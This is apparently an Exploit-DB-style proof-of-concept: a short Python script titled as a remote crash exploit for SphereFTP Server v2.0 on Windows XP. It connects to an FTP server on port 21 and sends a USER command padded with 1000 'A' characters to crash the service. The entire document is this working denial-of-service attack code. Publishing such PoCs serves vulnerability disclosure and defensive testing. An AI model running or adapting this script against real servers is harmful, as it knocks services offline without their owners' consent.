#!/usr/bin/python
# Exploit Title: SphereFTP Server v2.0 Remote Crash PoC
# Date: 2015-09-02
# Exploit Author: Meisam Monsef meisamrce@yahoo.com or meisamrce@gmail.com
# Vendor Homepage: http://www.menasoft.com/blog/?p=32
# Software Link: http://www.menasoft.com/sphereftp/sphereftp_win32_v20.zip
# Version: 2.0
# Tested on: Microsoft Windows XP Professional SP3

import socket
target = '192.168.0.166'
exploit = "A" * 1000
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((target,21))
s.send("USER "+exploit+"\r\n")
s.close()